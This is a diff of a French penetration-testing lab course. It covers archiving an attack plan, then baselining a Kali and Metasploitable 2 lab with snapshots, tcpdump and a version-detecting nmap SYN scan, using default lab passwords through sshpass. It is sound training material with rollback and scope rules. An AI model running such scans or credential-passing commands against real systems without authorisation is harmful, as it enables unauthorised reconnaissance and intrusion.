+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 sha256sum plan-attaque-maitre.md inventaire-techniques.csv journal-execution.csv \
@@ -1467,13 +1921,28 @@ tar -czf ch1-lab3-plan.tar.gz plan-attaque-maitre.md PV-gel-plan-v1.0.md \
   fiche-dry-run-T1046.md SHA256SUMS
 ```
 
-Résultat attendu : chaque fichier affiche `OK`, puis l'archive est créée.
+**Explication de la commande**
 
-**Explication de la commande** — `sha256sum -c` affiche `OK` pour chaque fichier. L'archive contient le plan gelé, le PV, l'inventaire, le journal, la couche, la fiche dry-run et les sommes. Piège courant : inclure `SHA256SUMS` dans son propre calcul ; il faut le créer après les autres fichiers.
+- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier listé.
+- `> SHA256SUMS` : écrit les empreintes dans un fichier de sommes.
+- `sha256sum -c SHA256SUMS` : relit le fichier de sommes et vérifie chaque fichier ; `OK` signifie que l'empreinte correspond.
+- `-c` : mode de vérification.
+- `tar -czf ch1-lab3-plan.tar.gz` : crée une archive compressée.
+- `-c` : crée l'archive ; `-z` : compresse avec gzip ; `-f` : indique le nom du fichier d'archive.
+- Les fichiers listés après le nom de l'archive sont ajoutés : plan, PV, inventaire, journal, couche, fiche dry-run et sommes.
+- Piège courant : inclure `SHA256SUMS` dans son propre calcul ; il faut créer le fichier de sommes après les autres fichiers.
 
-**Conclusion.** Vous avez un plan maître gelé, un inventaire de 68 techniques, une couche Navigator de 67 techniques et un contrôle automatique `PASS`. Le Lab-04 applique ce plan à la première phase d'exécution.
+**Résultat attendu**
 
-### 8.5 Résultats attendus
+Chaque fichier affiche `OK`, puis l'archive est créée.
+
+**Preuve** — `preuves/ch1-lab3/SHA256SUMS` et `preuves/ch1-lab3/ch1-lab3-plan.tar.gz`.
+
+### En conclusion
+
+Vous avez un plan maître gelé, un inventaire de 68 techniques, une couche Navigator de 67 techniques et un contrôle automatique `PASS`. Le Lab-04 applique ce plan à la première phase d'exécution.
+
+**Résultats attendus**
 
 | Élément | Valeur attendue | Vérification |
 |---|---:|---|
@@ -1485,7 +1954,7 @@ Résultat attendu : chaque fichier affiche `OK`, puis l'archive est créée.
 | Lignes du journal | 44 | `wc -l` |
 | Contrôle final | `PASS` | `verifie-lab3.sh` |
 
-### 8.6 Critères de réussite
+**Critères de réussite**
 
 - [ ] L'inventaire contient au moins 40 techniques et aucun doublon.
 - [ ] Les six identifiants legacy sont présents.
@@ -1498,15 +1967,16 @@ Résultat attendu : chaque fichier affiche `OK`, puis l'archive est créée.
 - [ ] `verifie-lab3.sh` retourne `PASS`.
 - [ ] L'archive finale est créée et `sha256sum -c` retourne `OK`.
 
-## 9. Lab-04 — Baseline, snapshots et première phase d'exécution
+## Lab-04 — Baseline, snapshots et première phase d'exécution
 
-### 9.1 Contexte et objectif
+### Énoncé / Contexte
 
 Avant d'exécuter une phase du plan, il faut une **référence** : l'état réseau et les services de chaque VM, une session terminal journalisée, une capture réseau de contrôle et un snapshot restaurable. Ce lab produit cette référence, puis exécute la première phase en mode passif (`-sV`), sans exploitation.
 
 **Place dans la chaîne** — après le gel du plan (Lab-03), avant l'énumération approfondie (Lab-05).
 
-À la fin de ce lab, vous devez être capable de :
+**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :
+
 - distinguer l'hôte, Kali et Metasploitable 2 dans une baseline ;
 - créer et vérifier un snapshot `avant-phase1` ;
 - journaliser une session avec `script` et nettoyer les séquences ANSI ;
@@ -1515,17 +1985,7 @@ Avant d'exécuter une phase du plan, il faut une **référence** : l'état rése
 - produire un inventaire de preuves qui ne s'inclut pas lui-même ;
 - comparer la phase 1 au plan gelé.
 
-**Outils et commandes utilisées**
-
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `VBoxManage` | `snapshot take`, `snapshot list`, `snapshot restore` | Snapshots de l'hôte (sysadmin) |
-| `script` | `script -q -c ... session.typescript` | Capture de session terminal |
-| `tcpdump` | `tcpdump -c 5 -nn -i vboxnet0` | Capture réseau de référence |
-| `ping` / `nmap` | `ping`, `nmap -sV` | Trafic contrôlé et phase 1 passive |
-| `sha256sum` / `scp` | `sha256sum`, `scp -r` | Archivage et intégrité |
-
-### 9.2 Plan MITRE ATT&CK
+**Plan MITRE ATT&CK**
 
 | Élément | Valeur |
 |---|---|
@@ -1535,7 +1995,7 @@ Avant d'exécuter une phase du plan, il faut une **référence** : l'état rése
 | Contrôle défensif | Snapshot, journalisation, comparaison au plan gelé |
 | Détection | Modification de configuration, capture réseau non planifiée, écart plan/journal |
 
-### 9.3 Prérequis
+**Prérequis**
 
 - Labs 1 à 3 terminés : empreinte, matrice CVE, plan gelé.
 - Snapshots disponibles. Sur Metasploitable 2, le snapshot `avant-phase1` est créé à l'étape 4. Sur Kali, un snapshot propre existant suffit.
@@ -1547,9 +2007,29 @@ Avant d'exécuter une phase du plan, il faut une **référence** : l'état rése
 
 > **Règle de rollback** — si la cible ne répond plus, si un service change d'état sans commande planifiée, ou si une capture montre un trafic hors `192.168.56.0/24`, arrêtez et restaurez le snapshot. Le rollback n'est pas une option : c'est une étape du plan.
 
-### 9.4 Étapes
+### Outils et commandes utilisées
 
-**Étape 1** — Baseline de l'hôte.
+| Outil | Commande | Rôle |
+|---|---|---|
+| `VBoxManage` | `snapshot take`, `snapshot list`, `snapshot restore` | Snapshots et restauration depuis l'hôte |
+| `script` | `script -q -c ... session.typescript` | Capture de session terminal |
+| `tcpdump` | `tcpdump -c 5 -nn -i vboxnet0` | Capture réseau de référence |
+| `ping` / `nmap` | `ping`, `nmap -sV` | Trafic contrôlé et phase 1 passive |
+| `sha256sum` / `scp` | `sha256sum`, `scp -r` | Archivage et intégrité |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Baseline de l'hôte
+
+**But** — enregistrer l'adresse, la route et les ports en écoute de l'hôte avant toute manipulation.
+
+**Machine** — hôte d'hypervision, `192.168.56.1`.
+
+**Prérequis** — shell à la racine du dépôt ; fonction `prouve` définie sur l'hôte.
+
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/host-ip.txt ip -br a
@@ -1557,11 +2037,33 @@ prouve preuves/ch1-lab4/host-route.txt ip route
 prouve preuves/ch1-lab4/host-services.txt bash -c "ss -tulpn"
 ```
 
-Résultat attendu : l'interface `vboxnet0` porte `192.168.56.1/24`, la route `192.168.56.0/24` est directement connectée, et aucun service du laboratoire n'écoute sur l'hôte.
+**Explication de la commande**
 
-**Explication de la commande** — L'hôte porte `192.168.56.1/24` sur `vboxnet0`. La route est directement connectée. Aucun service du laboratoire ne doit écouter sur l'hôte : si `ss` montre un service inattendu, identifiez-le avant de capturer.
+- `prouve ... host-ip.txt` : enregistre la sortie de la commande et son code retour.
+- `ip -br a` : affiche les interfaces réseau en format abrégé.
+- `prouve ... host-route.txt` : enregistre la table de routage.
+- `ip route` : affiche les routes, dont celle du réseau host-only.
+- `prouve ... host-services.txt` : enregistre les ports en écoute.
+- `bash -c "ss -tulpn"` : exécute `ss` dans un shell enfant ; les options affichent les sockets TCP et UDP, en écoute, avec les numéros de port et les processus.
+- Piège courant : lancer `ss` sans privilèges et ne pas voir les processus ; identifiez tout service inattendu avant de capturer.
 
-**Étape 2** — Baseline de Kali.
+**Résultat attendu**
+
+L'interface `vboxnet0` porte `192.168.56.1/24`, la route `192.168.56.0/24` est directement connectée, et aucun service du laboratoire n'écoute sur l'hôte.
+
+**Preuve** — `preuves/ch1-lab4/host-ip.txt`, `host-route.txt` et `host-services.txt`.
+
+#### Étape 2 — Baseline de Kali
+
+**But** — enregistrer l'adresse, la route et les ports en écoute de Kali, qui servent de référence pour détecter tout écart ultérieur.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — accès SSH à Kali ; fonction `prouve` définie.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/kali-ip.txt ip -br a
@@ -1569,7 +2071,18 @@ prouve preuves/ch1-lab4/kali-route.txt ip route
 prouve preuves/ch1-lab4/kali-services.txt bash -c "echo kali | sudo -S -p '' ss -tulpn"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... kali-ip.txt` : enregistre les interfaces de Kali.
+- `ip -br a` : affiche les interfaces en format abrégé.
+- `prouve ... kali-route.txt` : enregistre la table de routage.
+- `ip route` : affiche les routes.
+- `prouve ... kali-services.txt` : enregistre les ports en écoute avec les processus.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe `kali` à `sudo` sur l'entrée standard, sans invite.
+- `ss -tulpn` : sockets TCP et UDP, en écoute, avec ports et processus.
+- Piège courant : oublier `sudo` et ne pas voir les PID ; notez tout service inattendu, il peut fausser la capture.
+
+**Résultat attendu**
 
 ```text
 eth0             UP             192.168.56.101/24
@@ -1581,9 +2094,19 @@ tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",p
 
 Seul SSH écoute sur Kali. Si un autre service apparaît, notez-le : il peut fausser la capture.
 
-**Explication de la commande** — Kali n'écoute que SSH. C'est la référence : toute autre écoute apparue plus tard est un écart. La commande `ss -tulpn` doit être lancée avec `sudo` pour voir les PID.
+**Preuve** — `preuves/ch1-lab4/kali-ip.txt`, `kali-route.txt` et `kali-services.txt`.
 
-**Étape 3** — Baseline de Metasploitable 2.
+#### Étape 3 — Baseline de Metasploitable 2
+
+**But** — relever depuis Kali l'adresse, la route, les ports et les versions logicielles exactes de Metasploitable 2.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — SSH à Metasploitable 2 avec le compte `msfadmin` ; `sshpass` installé sur Kali.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 SSH="sshpass -p msfadmin ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.103"
@@ -1594,7 +2117,20 @@ prouve preuves/ch1-lab4/meta-services.txt bash -c "$SSH 'echo msfadmin | sudo -S
 prouve preuves/ch1-lab4/meta-versions.txt bash -c "$SSH 'uname -a; openssl version; dpkg-query -W openssl apache2 php5-cgi 2>/dev/null'"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `SSH="sshpass -p msfadmin ssh ..."` : définit une variable qui contient la commande SSH complète vers Metasploitable 2.
+- `sshpass -p msfadmin` : fournit le mot de passe du compte `msfadmin`.
+- `-q` : supprime les avertissements SSH.
+- `-o StrictHostKeyChecking=no` et `-o UserKnownHostsFile=/dev/null` : évitent l'empreinte persistante et l'invite de première connexion.
+- `-oHostKeyAlgorithms=+ssh-rsa` et `-oPubkeyAcceptedAlgorithms=+ssh-rsa` : autorisent les algorithmes anciens de la cible.
+- `prouve ... meta-ip.txt bash -c "$SSH 'ip a'"` : exécute `ip a` sur la cible et enregistre la sortie.
+- Les commandes suivantes enregistrent la route, les ports en écoute et les versions.
+- `netstat -tulpn` : équivalent ancien de `ss` sur Metasploitable 2.
+- `dpkg-query -W openssl apache2 php5-cgi` : affiche les versions des paquets installés.
+- Piège courant : conclure depuis la bannière Nmap ; la version exacte du noyau se lit dans la VM.
+
+**Résultat attendu**
 
 ```text
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
@@ -1604,34 +2140,60 @@ openssl 0.9.8g-4ubuntu3
 php5-cgi 5.2.4-2ubuntu5.10
 ```
 
-La version exacte du noyau est `2.6.24-16-server`. Elle complète l'estimation Nmap du Lab-01. La version OpenSSL `0.9.8g-4ubuntu3` est dans la plage de CVE-2008-0166 (`< 0.9.8g-9`).
+La version exacte du noyau est `2.6.24-16-server`. Elle complète l'estimation Nmap du Lab-01. La version OpenSSL `0.9.8g-4ubuntu3` est dans la plage de CVE-2008-0166 (`< 0.9.8g-9`). Meta expose de nombreux services, dont `rmiregistry` sur un port éphémère ; Apache `2.2.8-1` et PHP `5.2.4-2ubuntu5.10` complètent l'empreinte.
 
-**Explication de la commande** — Meta expose de nombreux services, dont `rmiregistry` sur un port éphémère. Le noyau exact est `2.6.24-16-server`. OpenSSL `0.9.8g-4ubuntu3` est dans la plage de CVE-2008-0166. Apache `2.2.8-1` et PHP `5.2.4-2ubuntu5.10` complètent l'empreinte.
+**Preuve** — `preuves/ch1-lab4/meta-ip.txt`, `meta-route.txt`, `meta-services.txt` et `meta-versions.txt`.
 
-**Étape 4** — Créer et vérifier le snapshot.
+#### Étape 4 — Créer et vérifier le snapshot
+
+**But** — disposer d'un point de restauration nommé `avant-phase1` avant toute action sur la cible.
+
+**Machine** — hôte d'hypervision, `192.168.56.1`.
+
+**Prérequis** — VM `Metasploitable2` éteinte ou suspendue ; `VBoxManage` disponible sur l'hôte.
+
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/snapshot-create.txt bash -c \
   "VBoxManage snapshot Metasploitable2 take avant-phase1"
 prouve preuves/ch1-lab4/snapshot-list.txt bash -c \
   "VBoxManage snapshot Metasploitable2 list"
+prouve preuves/ch1-lab4/snapshot-kali-list.txt bash -c "VBoxManage snapshot Kali list"
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve ... snapshot-create.txt bash -c "..."` : enregistre la création du snapshot et son code retour.
+- `VBoxManage snapshot Metasploitable2 take avant-phase1` : crée le snapshot nommé `avant-phase1` de la VM `Metasploitable2`.
+- `prouve ... snapshot-list.txt` : enregistre la liste des snapshots de la cible.
+- `VBoxManage snapshot Metasploitable2 list` : vérifie que le snapshot existe et affiche son UUID.
+- `prouve ... snapshot-kali-list.txt` : enregistre la liste des snapshots de Kali.
+- `VBoxManage snapshot Kali list` : vérifie le snapshot propre existant de Kali.
+- Si le snapshot existe déjà, `VBoxManage` retourne une erreur : vérifiez son nom avec `list`, ne le supprimez pas et notez la date de création.
+- Piège courant : créer `avant-phase1` après avoir déjà exécuté la phase 1 ; le snapshot ne sert alors à rien.
+
+**Résultat attendu**
 
 ```text
 Name: avant-phase1 (UUID: ...)
 ```
 
-Si le snapshot existe déjà, `VBoxManage` retourne une erreur. Dans ce cas, vérifiez son nom avec `list`, ne le supprimez pas et notez la date de création. Pour Kali, vérifiez le snapshot existant :
+**Preuve** — `preuves/ch1-lab4/snapshot-create.txt`, `snapshot-list.txt` et `snapshot-kali-list.txt`.
 
-```bash
-prouve preuves/ch1-lab4/snapshot-kali-list.txt bash -c "VBoxManage snapshot Kali list"
-```
+#### Étape 5 — Journaliser une session terminal
 
-**Explication de la commande** — `VBoxManage snapshot ... take` crée un point de restauration. Le nom `avant-phase1` est celui du plan. Si le snapshot existe déjà, ne le supprimez pas : vérifiez sa date et utilisez-le. Piège courant : créer `avant-phase1` après avoir déjà exécuté la phase 1 ; le snapshot ne sert alors à rien.
+**But** — conserver une trace brute d'une session, puis en produire une version lisible sans séquences ANSI.
 
-**Étape 5** — Journaliser une session terminal.
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `script` et `sed` installés ; répertoire `preuves/ch1-lab4/` existant.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/script-session.txt bash -c \
@@ -1640,11 +2202,34 @@ sed -r 's/\x1B\[[0-9;]*[mK]//g' preuves/ch1-lab4/session.typescript \
   > preuves/ch1-lab4/session-clean.txt
 ```
 
-Résultat attendu : `session.typescript` contient l'en-tête `Script started`, la route, les ports en écoute et `Script done`. `session-clean.txt` ne contient plus de séquences ANSI.
+**Explication de la commande**
 
-**Explication de la commande** — `script` capture tout, y compris les séquences ANSI. Le fichier brut est conservé comme preuve, et une version nettoyée est produite pour la lecture. `sed -r 's/\x1B\[[0-9;]*[mK]//g'` supprime les codes couleur et de déplacement. Ne supprimez pas le fichier brut : il prouve que la session n'a pas été réécrite.
+- `prouve ... script-session.txt` : enregistre l'exécution de `script` et son code retour.
+- `script -q -c 'ip route; ss -tln' preuves/ch1-lab4/session.typescript` : lance une session journalisée.
+- `-q` : mode silencieux, sans message de démarrage.
+- `-c 'ip route; ss -tln'` : exécute les deux commandes dans la session.
+- `preuves/ch1-lab4/session.typescript` : fichier brut de la session.
+- `sed -r 's/\x1B\[[0-9;]*[mK]//g'` : supprime les séquences ANSI de couleur et de déplacement.
+- `> preuves/ch1-lab4/session-clean.txt` : écrit la version nettoyée.
+- Piège courant : supprimer le fichier brut ; il prouve que la session n'a pas été réécrite.
 
-**Étape 6** — Capturer et relire cinq paquets ICMP.
+**Résultat attendu**
+
+`session.typescript` contient l'en-tête `Script started`, la route, les ports en écoute et `Script done`. `session-clean.txt` ne contient plus de séquences ANSI.
+
+**Preuve** — `preuves/ch1-lab4/session.typescript` et `preuves/ch1-lab4/session-clean.txt`.
+
+#### Étape 6 — Capturer et relire cinq paquets ICMP
+
+**But** — produire une capture réseau de référence limitée au trafic de contrôle entre Kali et Metasploitable 2.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `tcpdump` et `ping` installés ; accès `sudo` sur Kali.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/tcpdump.txt bash -c \
@@ -1652,7 +2237,22 @@ prouve preuves/ch1-lab4/tcpdump.txt bash -c \
 prouve preuves/ch1-lab4/tcpdump-read.txt tcpdump -nn -r preuves/ch1-lab4/tcpdump-baseline.pcap
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... tcpdump.txt` : enregistre la sortie de la capture et son code retour.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo` sans invite.
+- `sh -c '...'` : exécute la séquence dans un shell enfant.
+- `timeout 12` : borne la capture à 12 secondes.
+- `tcpdump -i eth0` : capture sur l'interface Kali connectée au réseau host-only ; côté hôte, l'interface équivalente est `vboxnet0`.
+- `-c 5` : arrête après cinq paquets capturés.
+- `-nn` : désactive la résolution DNS et des noms de ports.
+- `-w preuves/ch1-lab4/tcpdump-baseline.pcap` : écrit la capture au format pcap.
+- `icmp` : filtre uniquement le protocole ICMP.
+- `&` : place la capture en arrière-plan ; `sleep 1` laisse le temps de démarrer ; `ping -c 3 192.168.56.103` génère le trafic ; `wait` attend la fin de la capture.
+- `tcpdump -nn -r ...` : relit la capture sans résolution de noms.
+- Piège courant : lancer le ping avant la capture, ou capturer sur une interface qui ne porte pas `192.168.56.0/24`.
+
+**Résultat attendu**
 
 ```text
 5 packets captured
@@ -1663,25 +2263,60 @@ Résultat attendu (extrait réel) :
 23:12:12.620612 IP 192.168.56.103 > 192.168.56.101: ICMP echo reply, id 21324, seq 1, length 64
 ```
 
-La capture prouve que le trafic de contrôle reste dans `192.168.56.0/24`. Elle sert de référence pour le Lab-05.
+La capture prouve que le trafic de contrôle reste dans `192.168.56.0/24`. Elle sert de référence pour le Lab-05. Si la capture contient du trafic hors de ce réseau, arrêtez et vérifiez les interfaces.
 
-**Explication de la commande** — `tcpdump -c 5` s'arrête après cinq paquets. Le `& sleep 1; ping; wait` garantit que la capture est active avant le ping. `-nn` évite la résolution DNS. La relecture montre les requêtes et réponses ICMP entre `.101` et `.103`. Si la capture contient du trafic hors `192.168.56.0/24`, arrêtez et vérifiez les interfaces.
+**Preuve** — `preuves/ch1-lab4/tcpdump.txt`, `preuves/ch1-lab4/tcpdump-read.txt` et `preuves/ch1-lab4/tcpdump-baseline.pcap`.
 
-**Étape 7** — Exécuter la phase 1 en mode passif.
+#### Étape 7 — Exécuter la phase 1 en mode passif
+
+**But** — relever les versions des services ciblés et comparer le résultat au plan gelé, sans lancer d'exploit.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — plan gelé au Lab-03 ; `nmap` installé ; accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/phase1-versions.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sS -n -sV -p 21,22,80,139,445,3306,5432 192.168.56.103"
 ```
 
-Résultat attendu : les versions de FTP, SSH, HTTP, SMB, MySQL et PostgreSQL. Comparez avec le plan gelé :
+**Explication de la commande**
+
+- `prouve ... phase1-versions.txt` : enregistre la sortie Nmap et son code retour.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- `nmap` : lance le scanner réseau.
+- `-sS` : scan SYN, demi-connexion TCP.
+- `-n` : aucune résolution DNS.
+- `-sV` : détection des versions de services ; c'est le mode passif de cette phase.
+- `-p 21,22,80,139,445,3306,5432` : ports FTP, SSH, HTTP, SMB, MySQL et PostgreSQL.
+- `192.168.56.103` : cible Metasploitable 2.
+- Piège courant : modifier le plan gelé après un écart ; créez un avenant. Un port fermé ne prouve pas l'absence de vulnérabilité.
+
+**Résultat attendu**
+
+Les versions de FTP, SSH, HTTP, SMB, MySQL et PostgreSQL. Comparez avec le plan gelé :
+
 - si la version correspond, marquez l'étape `Exécuté` ;
 - si la version diffère, marquez `Bloqué` et documentez l'écart ;
 - si le port est fermé, ne concluez pas à une vulnérabilité : vérifiez le service sur la cible.
 
-**Explication de la commande** — La phase 1 est passive : `-sV` identifie les versions, sans exploit. Comparez chaque ligne au plan. Une version identique donne `Exécuté`. Une version différente donne `Bloqué` et un écart documenté. Ne modifiez pas le plan gelé : créez un avenant.
+**Preuve** — `preuves/ch1-lab4/phase1-versions.txt`.
 
-**Étape 8** — Remplir quatre fiches dry-run.
+#### Étape 8 — Remplir quatre fiches dry-run
+
+**But** — préparer les fiches go/no-go des quatre techniques sensibles retenues dans le plan, sans les exécuter.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — modèle `modeles/fiche-dry-run.md` présent.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 mkdir -p preuves/ch1-lab4/dry-run
@@ -1691,13 +2326,35 @@ done
 ls -l preuves/ch1-lab4/dry-run
 ```
 
-Résultat attendu : quatre fichiers de 1 889 octets. Complétez chaque fiche avec la cible, la commande, le résultat attendu, la preuve, la détection, la mitigation et le rollback.
+**Explication de la commande**
+
+- `mkdir -p preuves/ch1-lab4/dry-run` : crée le répertoire des fiches sans erreur s'il existe déjà.
+- `for f in ...; do ... done` : boucle sur les quatre noms de fiches.
+- `T1190-sqli`, `T1203-T1068-buffer-overflow`, `T1498-T1499-dos` et `T1550.002-T1110-credentials` : techniques couvertes.
+- `cp modeles/fiche-dry-run.md "preuves/ch1-lab4/dry-run/$f.md"` : copie le modèle sous le nom de chaque technique.
+- `ls -l` : vérifie la création des quatre fichiers.
+- Complétez chaque fiche avec la cible, la commande, le résultat attendu, la preuve, la détection, la mitigation et le rollback.
+- Piège courant : valider une fiche sans rollback ; elle est refusée.
+
+**Résultat attendu**
+
+Quatre fichiers de 1 889 octets.
 
 > **Périmètre** — les fiches `T1498/T1499` (déni de service) et `T1550.002/T1110` (credentials) sont des **fiches de planification**. Elles ne sont pas exécutées dans ce chapitre. Leur présence prouve que le risque est identifié et encadré, pas qu'il est testé.
 
-**Explication de la commande** — Les quatre fiches couvrent des techniques sensibles. Elles sont remplies mais **non exécutées**. Une fiche sans rollback est refusée. Le modèle contient les champs nécessaires ; si un champ reste vide, la fiche n'est pas validée.
+**Preuve** — `preuves/ch1-lab4/dry-run/T1190-sqli.md`, `T1203-T1068-buffer-overflow.md`, `T1498-T1499-dos.md` et `T1550.002-T1110-credentials.md`.
 
-**Étape 9** — Remplir le journal d'exécution.
+#### Étape 9 — Remplir le journal d'exécution
+
+**But** — mettre à jour le journal du plan avec les statuts, les preuves et les notes des étapes Ch1 Lab1 à Lab4.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — modèle `modeles/journal-execution.csv` présent.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 cp modeles/journal-execution.csv preuves/ch1-lab4/journal-execution.csv
@@ -1705,30 +2362,66 @@ head -1 preuves/ch1-lab4/journal-execution.csv
 wc -l preuves/ch1-lab4/journal-execution.csv
 ```
 
-Résultat attendu : l'en-tête de 15 colonnes et 45 lignes (1 en-tête + 44 étapes). Remplissez les colonnes `statut`, `preuve` et `notes` pour les étapes Ch1 Lab1 à Lab4.
+**Explication de la commande**
 
-**Explication de la commande** — Le journal contient 44 étapes. Les colonnes `statut`, `preuve` et `notes` sont obligatoires. Un journal sans preuve n'est pas un journal, c'est une intention. Les statuts autorisés sont `Planifié`, `En cours`, `Exécuté`, `Bloqué`.
+- `cp modeles/journal-execution.csv preuves/ch1-lab4/journal-execution.csv` : copie le modèle de journal dans les preuves du lab.
+- `head -1` : affiche l'en-tête pour vérifier les 15 colonnes.
+- `wc -l` : compte les lignes, en-tête compris.
+- Remplissez les colonnes `statut`, `preuve` et `notes` pour les étapes Ch1 Lab1 à Lab4.
+- Les statuts autorisés sont `Planifié`, `En cours`, `Exécuté`, `Bloqué`.
+- Piège courant : un journal sans preuve n'est pas un journal, c'est une intention ; chaque ligne exécutée doit pointer vers une preuve.
 
-**Étape 10** — Produire un inventaire sans auto-inclusion.
+**Résultat attendu**
+
+L'en-tête de 15 colonnes et 45 lignes (1 en-tête + 44 étapes).
+
+**Preuve** — `preuves/ch1-lab4/journal-execution.csv`.
+
+#### Étape 10 — Produire un inventaire sans auto-inclusion
+
+**But** — lister les preuves du lab sans inclure le fichier d'inventaire lui-même.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — preuves des étapes 1 à 9 présentes dans `preuves/ch1-lab4/`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab4/inventaire.txt bash -c \
   "find preuves/ch1-lab4 -type f ! -name 'inventaire.txt' ! -name 'INVENTAIRE-GLOBAL.txt' ! -name '*.log' | sort"
-```
-
-Résultat attendu : la liste des preuves, sans la ligne `inventaire.txt`. Vérifiez :
-
-```bash
 grep -c 'inventaire.txt' preuves/ch1-lab4/inventaire.txt
 ```
 
-Résultat attendu : `0`.
+**Explication de la commande**
 
-**Explication de la commande** — `find ... ! -name 'inventaire.txt'` exclut le fichier de sortie. Sans cette exclusion, le fichier s'inclut lui-même et la liste change à chaque exécution. Vérifiez avec `grep -c`, qui doit retourner `0`.
+- `prouve ... inventaire.txt` : enregistre la liste des preuves dans un fichier.
+- `find preuves/ch1-lab4 -type f` : parcourt les fichiers du répertoire.
+- `! -name 'inventaire.txt'` : exclut le fichier de sortie lui-même.
+- `! -name 'INVENTAIRE-GLOBAL.txt'` et `! -name '*.log'` : excluent les inventaires consolidés et les journaux.
+- `| sort` : trie la liste.
+- `grep -c 'inventaire.txt'` : compte les occurrences du nom dans le fichier produit ; la valeur attendue est `0`.
+- Piège courant : omettre l'exclusion ; le fichier s'inclut lui-même et la liste change à chaque exécution.
 
-**Étape 11** — Copier les preuves Kali vers l'hôte.
+**Résultat attendu**
 
-Sur l'hôte, dans la racine du dépôt :
+La liste des preuves, sans la ligne `inventaire.txt`. La vérification affiche `0`.
+
+**Preuve** — `preuves/ch1-lab4/inventaire.txt`.
+
+#### Étape 11 — Copier les preuves Kali vers l'hôte
+
+**But** — rapatrier les preuves produites sur Kali dans le dépôt de l'hôte, sans écraser les preuves déjà présentes.
+
+**Machine** — hôte d'hypervision, `192.168.56.1`, vers Kali `192.168.56.101`.
+
+**Prérequis** — preuves Kali présentes ; `sshpass` et `scp` sur l'hôte.
+
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt
+
+**Exemple de commande**
 
 ```bash
 mkdir -p preuves/ch1-lab4
@@ -1737,13 +2430,36 @@ sshpass -p kali scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/nu
 ls preuves/ch1-lab4 | head
 ```
 
-Résultat attendu : les fichiers de Kali sont présents dans `preuves/ch1-lab4/` sur l'hôte, sans écraser les preuves de l'hôte.
+**Explication de la commande**
 
-**Explication de la commande** — La copie `scp -r` conserve les fichiers de Kali dans `preuves/ch1-lab4/` sur l'hôte. `-q` supprime la bannière SSH. Vérifiez que les preuves de l'hôte ne sont pas écrasées : `ls` doit montrer les deux ensembles.
+- `mkdir -p preuves/ch1-lab4` : crée le répertoire de destination sur l'hôte.
+- `sshpass -p kali` : fournit le mot de passe du compte `kali`.
+- `scp` : copie des fichiers par SSH.
+- `-q` : supprime la bannière et les messages de progression.
